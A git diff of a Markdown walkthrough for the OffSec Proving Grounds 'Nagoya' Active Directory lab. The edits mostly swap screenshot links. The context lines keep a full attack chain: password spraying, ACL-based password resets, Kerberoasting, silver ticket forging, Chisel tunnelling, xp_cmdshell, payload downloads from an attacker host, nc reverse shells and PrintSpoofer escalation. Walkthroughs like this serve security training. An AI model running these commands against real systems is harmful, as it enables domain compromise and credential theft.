@@ -1,10 +1,13 @@
 # Nagoya(AD) — Proving Grounds Writeup
 
 **Platform:** Proving Grounds Practice
+
 **OS:** Windows Server (Active Directory)
+
 **Domain:** `nagoya-industries.com`
+
 **Difficulty:** Hard
-**Job Role:** Junior Penetration Tester / Bug Bounty Hunter
+
 **Tags:** OSINT · Username Enumeration · Password Spraying · BloodHound · GenericAll Abuse · Kerberoasting · Silver Ticket · Chisel Port Forwarding · MSSQL RCE · SeImpersonatePrivilege · PrintSpoofer
 
 ---
@@ -54,9 +57,8 @@
 nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.144.21
 ```
 
-**Screenshot — Nmap Scan Output:**
+<img width="1155" height="776" alt="image" src="https://github.com/user-attachments/assets/bd9f26ed-d0db-4297-8953-d1e2bbdaefa6" />
 
-![Nmap Scan](screenshots/nmap_scan.png)
 
 **Ports Discovered:**
 
@@ -87,9 +89,8 @@ nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.144.21
 echo "192.168.144.21 nagoya-industries.com nagoya" | sudo tee -a /etc/hosts
 ```
 
-**Screenshot — /etc/hosts Updated:**
+<img width="644" height="258" alt="image" src="https://github.com/user-attachments/assets/dbdcbf75-5b7a-47e2-8f1b-5c6f93989f05" />
 
-![Hosts File](screenshots/hosts_file.png)
 
 ---
 
@@ -101,7 +102,8 @@ Visiting `http://192.168.144.21` reveals the **Nagoya Industries** company websi
 
 **Screenshot — Nagoya Industries Homepage:**
 
-![Website Homepage](screenshots/website_homepage.png)
+<img width="1472" height="920" alt="image" src="https://github.com/user-attachments/assets/40abd2cd-c5c0-4711-ad7b-d8c13033aafc" />
+
 
 ### Employee Name Harvesting
 
@@ -109,7 +111,8 @@ The website exposes a **Team** page listing employee full names — a critical O
 
 **Screenshot — Employee Team Page:**
 
-![Employee Team Page](screenshots/employee_team.png)
+<img width="1164" height="736" alt="image" src="https://github.com/user-attachments/assets/2117c9e1-d335-42ef-9342-8cc47c74229b" />
+
 
 **Employees harvested:**
 
@@ -133,9 +136,8 @@ nano nagoya_user.txt
 # Paste all employee names, one per line
 ```
 
-**Screenshot — nagoya_user.txt Created:**
+<img width="406" height="571" alt="image" src="https://github.com/user-attachments/assets/33cecd55-c3e9-409f-8221-dd9176c2f80e" />
 
-![User List Created](screenshots/nagoya_usertxt.png)
 
 ---
 
@@ -151,9 +153,8 @@ cd username-anarchy
 ./username-anarchy -i nagoya_user.txt > domain-users.txt
 ```
 
-**Screenshot — Username-Anarchy Generating Variants:**
+<img width="788" height="198" alt="image" src="https://github.com/user-attachments/assets/f8109f0c-5034-40dd-963b-06a202d9c885" />
 
-![Username Anarchy](screenshots/username_anarchy.png)
 
 Sample output formats generated:
 ```
@@ -167,9 +168,8 @@ m.harrison, mharrison, emma, emma.miah, emmam, e.miah ...
 kerbrute userenum --dc 192.168.144.21 -d nagoya-industries.com domain-users.txt
 ```
 
-**Screenshot — Kerbrute Validation (28 Valid Users Found):**
+<img width="1059" height="615" alt="image" src="https://github.com/user-attachments/assets/b77857bd-d71d-40de-bca6-0178ab1c27a5" />
 
-![Kerbrute User Validation](screenshots/kerbrute_enum.png)
 
 ```
 2025/08/30 17:32:31 > Using KDC(s): 192.168.144.21:88
@@ -197,9 +197,8 @@ christopher.lewis   megan.johnson     damien.chapman
 joanne.lewis
 ```
 
-**Screenshot — Refined user2.txt:**
+<img width="627" height="605" alt="image" src="https://github.com/user-attachments/assets/686e5ae2-f4a3-419f-99a8-e4d010b49b97" />
 
-![User2 List](screenshots/user2_txt.png)
 
 ---
 
@@ -221,9 +220,10 @@ crackmapexec smb 192.168.144.21 -u user2.txt -p Summer2023
 crackmapexec smb 192.168.144.21 -u user2.txt -p Nagoya2023
 ```
 
-**Screenshot — Password Spray Results — Two Hits:**
+<img width="1130" height="139" alt="image" src="https://github.com/user-attachments/assets/638afddc-3a98-4582-a575-a0700fdefbe2" />
+<img width="1004" height="101" alt="image" src="https://github.com/user-attachments/assets/b2d92c73-7a24-47f9-95a5-4a47092bcb56" />
 
-![Password Spray](screenshots/password_spray.png)
+
 
 **Valid credentials found:**
 
@@ -247,9 +247,8 @@ bloodhound-python \
   -c all
 ```
 
-**Screenshot — BloodHound Collection Complete:**
+<img width="1601" height="611" alt="image" src="https://github.com/user-attachments/assets/c06321a8-27d1-43c7-889e-7ed0fd16c1cb" />
 
-![BloodHound Collection](screenshots/bloodhound_collection.png)
 
 Zip and import into BloodHound:
 
@@ -260,17 +259,14 @@ zip -r nagoya_bh.zip *.json
 
 ### BloodHound Graph Analysis
 
-**Screenshot — BloodHound — Fiona Clark Group Membership:**
+<img width="1390" height="320" alt="image" src="https://github.com/user-attachments/assets/cd68a2f6-8a91-479b-83fa-040701902375" />
+<img width="1210" height="307" alt="image" src="https://github.com/user-attachments/assets/dd49a52d-2306-44f2-9532-fbbcb7ce135c" />
+<img width="1391" height="341" alt="image" src="https://github.com/user-attachments/assets/8ee62d0e-b34b-4e70-b3db-e70af1b3d686" />
+<img width="1636" height="332" alt="image" src="https://github.com/user-attachments/assets/15f25683-57f1-4a85-8df7-fbd1e3eee105" />
+<img width="1073" height="630" alt="image" src="https://github.com/user-attachments/assets/41d4398d-edfd-48be-b304-d263e95a5cb7" />
+<img width="1140" height="384" alt="image" src="https://github.com/user-attachments/assets/f61995fa-9467-40c7-8ed4-4834b2397b47" />
 
-![BloodHound Fiona Clark](screenshots/bloodhound_fiona.png)
 
-**Screenshot — BloodHound — GenericAll Privilege Chain:**
-
-![BloodHound ACL Chain](screenshots/bloodhound_acl_chain.png)
-
-**Screenshot — BloodHound — Christopher Lewis Remote Management:**
-
-![BloodHound Christopher](screenshots/bloodhound_christopher.png)
 
 **Critical ACL Privilege Chain Discovered:**
 
@@ -296,9 +292,8 @@ rpcclient -U "fiona.clark%Summer2023" 192.168.144.21
 rpcclient $> setuserinfo2 svc_helpdesk 23 Password1
 ```
 
-**Screenshot — svc_helpdesk Password Changed:**
+<img width="585" height="138" alt="image" src="https://github.com/user-attachments/assets/83c3c10a-4473-4fef-8e10-a8dcb2f32a7a" />
 
-![svc_helpdesk Password Reset](screenshots/rpcclient_helpdesk.png)
 
 ### Step 2 — Reset christopher.lewis Password via svc_helpdesk
 
@@ -307,9 +302,8 @@ rpcclient -U "svc_helpdesk%Password1" 192.168.144.21
 rpcclient $> setuserinfo2 christopher.lewis 23 Password1
 ```
 
-**Screenshot — christopher.lewis Password Changed:**
+<img width="696" height="159" alt="image" src="https://github.com/user-attachments/assets/646dc6f8-284b-49e5-bc5c-b6cf81f002b9" />
 
-![christopher.lewis Password Reset](screenshots/rpcclient_christopher.png)
 
 **Credential chain established:**
 
@@ -327,9 +321,9 @@ fiona.clark:Summer2023 → svc_helpdesk:Password1 → christopher.lewis:Password
 evil-winrm -i 192.168.144.21 -u christopher.lewis -p Password1
 ```
 
-**Screenshot — WinRM Shell as christopher.lewis:**
+<img width="1108" height="289" alt="image" src="https://github.com/user-attachments/assets/ea77c2df-b5db-44a7-a703-25fa6b059c94" />
+<img width="1377" height="359" alt="image" src="https://github.com/user-attachments/assets/23a2419f-bdec-4697-88e3-ea7e6e7109aa" />
 
-![Evil-WinRM Shell](screenshots/evil_winrm_shell.png)
 
 ```
 C:\Users\christopher.Lewis\Documents>
@@ -349,9 +343,8 @@ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
   nagoya-industries.com/fiona.clark:Summer2023
 ```
 
-**Screenshot — SPNs Discovered:**
+<img width="1434" height="224" alt="image" src="https://github.com/user-attachments/assets/99025e1b-663b-4266-8410-5e7c03ae12e8" />
 
-![GetUserSPNs](screenshots/getuserspns.png)
 
 **SPNs found:**
 
@@ -370,15 +363,16 @@ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
   -outputfile svc_hash
 ```
 
-**Screenshot — TGS Hashes Captured:**
+<img width="1600" height="564" alt="image" src="https://github.com/user-attachments/assets/ccd2037f-0987-4e46-a250-1a4425681759" />
 
-![Kerberoast Hashes](screenshots/kerberoast_hashes.png)
 
 ### Crack Hashes with Hashcat
 
 ```bash
 hashcat -m 13100 svc_hash /usr/share/wordlists/rockyou.txt
 ```
+<img width="1628" height="483" alt="image" src="https://github.com/user-attachments/assets/2c09b286-2548-4aa7-9a78-ce175a7707f3" />
+
 
 **Cracked credentials:**
 
@@ -399,9 +393,8 @@ Check MSSQL from the christopher.lewis WinRM shell:
 netstat -ano | Select-String "1433"
 ```
 
-**Screenshot — Port 1433 Listening Internally:**
+<img width="733" height="155" alt="image" src="https://github.com/user-attachments/assets/625b32e5-d857-411e-a84b-3dd5f9bf781b" />
 
-![Port 1433 Internal](screenshots/netstat_1433.png)
 
 ```
 TCP  0.0.0.0:1433   0.0.0.0:0   LISTENING   3612
@@ -417,9 +410,8 @@ Port 1433 is listening but firewalled externally. Use Chisel to tunnel it.
 chisel server --socks5 --reverse -p 139
 ```
 
-**Screenshot — Chisel Server Listening:**
+<img width="742" height="133" alt="image" src="https://github.com/user-attachments/assets/fc5c279b-08b2-475c-ad78-c9bc4ae0de3a" />
 
-![Chisel Server](screenshots/chisel_server.png)
 
 **Transfer Chisel to target (via christopher.lewis WinRM):**
 
@@ -434,9 +426,9 @@ python3 -m http.server 8000
 certutil -urlcache -f http://192.168.45.158:8000/chisel.exe chisel.exe
 ```
 
-**Screenshot — Chisel.exe Downloaded to Target:**
+<img width="702" height="239" alt="image" src="https://github.com/user-attachments/assets/70678252-face-4325-bcfc-c37f618bc94e" />
+<img width="1115" height="116" alt="image" src="https://github.com/user-attachments/assets/375987cf-f54f-4d8e-92df-873eee8abca9" />
 
-![Chisel Downloaded](screenshots/chisel_downloaded.png)
 
 **Connect back and forward port 1433:**
 
@@ -446,7 +438,8 @@ cmd /c "chisel client 192.168.45.158:139 R:1433:127.0.0.1:1433"
 
 **Screenshot — Chisel Client Connected:**
 
-![Chisel Connected](screenshots/chisel_connected.png)
+<img width="1312" height="147" alt="image" src="https://github.com/user-attachments/assets/59b9cd2a-e208-4c95-98aa-c73934aeff2f" />
+
 
 ### Verify Tunnel
 
@@ -454,9 +447,8 @@ cmd /c "chisel client 192.168.45.158:139 R:1433:127.0.0.1:1433"
 nmap 127.0.0.1 -p 1433
 ```
 
-**Screenshot — Port 1433 Now Open on Localhost:**
+<img width="657" height="211" alt="image" src="https://github.com/user-attachments/assets/f5a22a19-dac7-479c-b7ed-4e53b9c570d8" />
 
-![MSSQL Port Forwarded](screenshots/mssql_port_forwarded.png)
 
 ```
 PORT     STATE  SERVICE
@@ -474,9 +466,8 @@ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
   svc_mssql:Service1@127.0.0.1 -windows-auth
 ```
 
-**Screenshot — MSSQL Connected as svc_mssql (guest):**
+<img width="1056" height="288" alt="image" src="https://github.com/user-attachments/assets/e3962787-9983-441a-8b57-3323f497a0fe" />
 
-![MSSQL svc_mssql](screenshots/mssql_svcmssql.png)
 
 ```sql
 SQL (NAGOYA-IND\svc_mssql guest@master)> enable_xp_cmdshell
@@ -495,9 +486,8 @@ Get-ADDomain
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 
-**Screenshot — Domain SID and SPN:**
+<img width="1302" height="546" alt="image" src="https://github.com/user-attachments/assets/a8238f6a-718b-406b-97d7-06b89d103f96" />
 
-![Domain SID](screenshots/domain_sid.png)
 
 ```
 Domain SID   : S-1-5-21-1969309164-1513403977-1686805993
@@ -511,9 +501,8 @@ User-ID 500  : Administrator
 echo -n 'Service1' | iconv -t UTF-16LE | openssl md4
 ```
 
-**Screenshot — NTLM Hash Generated:**
+<img width="673" height="84" alt="image" src="https://github.com/user-attachments/assets/54ab9b47-2930-4916-aba9-4162af1d9b67" />
 
-![NTLM Hash](screenshots/ntlm_hash.png)
 
 ```
 MD4(stdin) = e3a0168bc21cfb88b95c954a5b18f57c
@@ -530,10 +519,8 @@ python3 /usr/share/doc/python3-impacket/examples/ticketer.py \
   -user-id 500 \
   Administrator
 ```
+<img width="1391" height="348" alt="image" src="https://github.com/user-attachments/assets/26e8a202-198c-4965-98f3-d05c77d66ff4" />
 
-**Screenshot — Silver Ticket Forged:**
-
-![Silver Ticket Forged](screenshots/silver_ticket_forged.png)
 
 ```
 [*] Creating basic skeleton ticket and PAC Infos
@@ -585,7 +572,8 @@ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py \
 
 **Screenshot — MSSQL Connected as Administrator via Silver Ticket:**
 
-![MSSQL Administrator](screenshots/mssql_administrator.png)
+<img width="1192" height="472" alt="image" src="https://github.com/user-attachments/assets/acdf50ee-0191-422a-a351-0b61729d695c" />
+
 
 ```
 SQL (NAGOYA-IND\Administrator dbo@master)>
@@ -602,9 +590,8 @@ SQL> enable_xp_cmdshell
 SQL> xp_cmdshell "whoami /priv"
 ```
 
-**Screenshot — xp_cmdshell Enabled, Privileges Shown:**
+<img width="1367" height="704" alt="image" src="https://github.com/user-attachments/assets/1e45ad69-e465-4a20-8126-5a6652a60004" />
 
-![xp_cmdshell Enabled](screenshots/xp_cmdshell.png)
 
 Key privilege noted: **SeImpersonatePrivilege** — `Enabled`
 
@@ -623,9 +610,8 @@ python3 -m http.server 80
 SQL> xp_cmdshell "curl http://192.168.45.158/nc.exe -o c:\temp\nc.exe"
 ```
 
-**Screenshot — nc.exe Uploaded to Target:**
+<img width="1175" height="317" alt="image" src="https://github.com/user-attachments/assets/84d78266-4846-4b9f-85d4-06ca8f5ccbec" />
 
-![nc.exe Upload](screenshots/nc_upload.png)
 
 **Trigger reverse shell:**
 
@@ -639,9 +625,8 @@ SQL> xp_cmdshell "c:\temp\nc.exe 192.168.45.158 445 -e cmd.exe"
 rlwrap nc -lv 445
 ```
 
-**Screenshot — Shell Received as svc_mssql$:**
+<img width="626" height="294" alt="image" src="https://github.com/user-attachments/assets/66c75cf1-bbb8-4f03-8fbc-c9b9a4d6ae21" />
 
-![Shell as svc_mssql](screenshots/shell_svcmssql.png)
 
 ```
 C:\Windows\system32> whoami
@@ -658,9 +643,8 @@ nagoya-ind\svc_mssql
 whoami /priv
 ```
 
-**Screenshot — SeImpersonatePrivilege Enabled:**
+<img width="1369" height="765" alt="image" src="https://github.com/user-attachments/assets/fe365fe8-b460-4ea5-8ab8-e67cd8d5724b" />
 
-![SeImpersonate](screenshots/seimpersonate.png)
 
 ```
 SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
@@ -678,9 +662,9 @@ python3 -m http.server 80
 curl http://192.168.45.158/PrintSpoofer.exe -o c:\temp\PrintSpoofer.exe
 ```
 
-**Screenshot — PrintSpoofer and nc.exe Uploaded:**
+<img width="1727" height="584" alt="image" src="https://github.com/user-attachments/assets/ee05fc06-5920-474f-8368-67e83ce7f242" />
+<img width="1694" height="320" alt="image" src="https://github.com/user-attachments/assets/a56bbf2c-b297-431c-8b4e-3377a8c177a5" />
 
-![PrintSpoofer Upload](screenshots/printspoofer_upload.png)
 
 ### Execute PrintSpoofer → SYSTEM Shell
 
@@ -694,9 +678,8 @@ rlwrap nc -lvnp 8000
 PrintSpoofer.exe -c "nc.exe 192.168.45.158 8000 -e cmd"
 ```
 
-**Screenshot — SYSTEM Shell via PrintSpoofer:**
+<img width="1666" height="161" alt="image" src="https://github.com/user-attachments/assets/7c75c4ac-f276-454c-a60d-2d0eec1180f9" />
 
-![SYSTEM Shell](screenshots/system_shell.png)
 
 ```
 C:\Windows\system32> whoami
@@ -713,6 +696,9 @@ nt authority\system
 
 After priv escalation, connect via `evil-winrm` as `christopher.lewis` to retrieve local.txt:
 
+<img width="727" height="170" alt="image" src="https://github.com/user-attachments/assets/589ba870-f4ef-41b0-a202-ceb919eb3b22" />
+
+
 ```bash
 evil-winrm -i 192.168.144.21 -u christopher.lewis -p Password1
 ```
@@ -728,9 +714,8 @@ C:\Users\Administrator\Desktop> type proof.txt
 0ec1436eb37fb7ef3b86e973e9090c6
 ```
 
-**Screenshot — proof.txt:**
+<img width="805" height="289" alt="image" src="https://github.com/user-attachments/assets/8e0c542e-9851-45a1-a351-d0f2e45c3952" />
 
-![proof.txt](screenshots/proof_txt.png)
 
 ---
 
@@ -912,5 +897,5 @@ Target: 192.168.144.21 | Domain: nagoya-industries.com
 ---
 
 **Platform:** OffSec Proving Grounds Practice
-**Author:** Tanvir Ahmed | [tanvirkarim.it](https://tanvirkarim.it)
-**GitHub:** [github.com/Tanvir-2](https://github.com/Tanvir-2)
+
+**Author:** Tanvir Ahmed 
